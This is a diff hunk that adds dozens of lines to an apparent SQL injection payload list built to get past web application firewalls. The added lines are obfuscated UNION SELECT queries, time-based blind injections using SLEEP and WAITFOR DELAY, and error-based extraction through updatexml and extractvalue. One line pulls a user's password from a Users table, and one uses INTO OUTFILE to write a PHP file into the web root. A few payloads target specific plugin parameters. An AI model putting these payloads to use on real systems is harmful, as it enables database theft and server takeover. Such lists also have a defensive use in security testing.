@@ -501,6 +501,75 @@ union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 /*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
 CoNcAt()
 concat()
+
+%00' UNION SELECT password FROM Users WHERE username-'tom'--
+/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/'tom'--
+[“1807192982')) union select 1#”]
+"[“1807192982')) union se”,”lect 1#”]"
+"[“1807192982')) union/**/select/**/1,/**/2,/**/3,/**/4,/**/5,/**/6,/**/7,/**/8,/**/9,/**/’pentestit’,/**/11#”]"
+%55%4eiON SeLeCt 1...
+union (/*!/**/ SeleCT */ 1....)
+%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74
+(select%20group_concat(table_name)%20from%20information_schema.columns%20where%20table_schema=database())
+"%55nion(%53elect+1,/*!50000concat*/(0x3c7363726970743e616c657274607873735f795f73716c5f62795f59303030215f())..."
+/*!%55NiOn*/%20/*!%53eLEct*/+
+"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,%27soy%20vulnerable%27+--+"
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+a' UNION SELECT 1 FROM information_schema.columns -- - \u0061\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0031\u002C\u0020\
+/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
+%0A%0d+select+user+from+dual+%0A%0D
+"""un<>ion sel<>ect"""
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+sle%25p%28'0x12'%2b1) => sleep('ox12' + 1)
+.1union/**_**/select/*!.1*/--+
+uNioN sElEcT 1();-- -
+if/*!90000*/((3*9)>(0)/*!80000*/(10))/*
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+ INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
+/*!50000union select*/
+/*!12345union select*/
+/*!13337union select*/
+%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+*!50000group_coNcat(*/) /*!50000coNcat(*/) `coNcat`%0a%0b%0c%0d%a0() concat/**x**/()
+param?id=@:=(%23 a %0a select 123 from ((table)))/1e0union%23 a %0a
+/**/ORDER/**/BY/**/
+/*!order*/+/*!by*/
+/*!ORDER BY*/
+/*!50000ORDER BY*/
+?XOR(if(now()=sysdate()(5*5)))OR?
+uniUNIONon
+%27/**/%256fR/**/50%2521%253D22%253B%2523
+0%20/*!union*/%20/*!select*/%201()()
+"/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1())))*/)"
+-1′ and .0union+distinct+select+1+–+
+qaramany'%2buser_name(@@version)--
+1%27/** /%256FR/** /50%2521%253D22%253B%2523
+%2522%252B%254F%2552%252B%2531%2521%253D%2537%2523
+"1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’))),’>{brute_force}(.+)?@<‘,’i’)"
+-1' and .0union+distinct+select+1+--+
+%3CF5%3E/strrr/821}+union+%23%0a+distinctrow%0b/**/select+1--{%3CF5%3E/**/TRUE
+"’%2buser_name(convert(int,(SESSION_USER))) — ’%2buser_name(UPPER(‘sql+tutorial+is+fun!’)) — ’%2buser_name(IIF(5=4,+’YES’,+’HackedBy_c0nqr0r&0x4m’)) — ’%2buser_name(convert(int,(db_name()))) —"
+"""') AND (updatexml(1(0x7e,(select user()))))-- qw"""
+"f'1) UNION SELECT 1,{title}(""fa fa-"") from wp_users%23"
+action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b)
+1%20AND%20(SELECT%209312%20FROM%20(SELECT(SLEEP(5)))hYkP
+111+AND+(SELECT+5926+FROM+(SELECT(SLEEP(5)))erUA) 
+"{""sku"":""a\"" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}"
+SELECT * FROM test WHERE id = 1 WAITFOR DELAY'0:0:5'
+-16'and@:=
+null /*!12345union*/ select 1
+%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D
+(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+
+ 1337&#x27;+or+1=1;--+
+SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(3) ELSE sleep(0) END
+SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END
+clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-
+
 CON%08CAT()
 CoNcAt()
 %0AcOnCat()
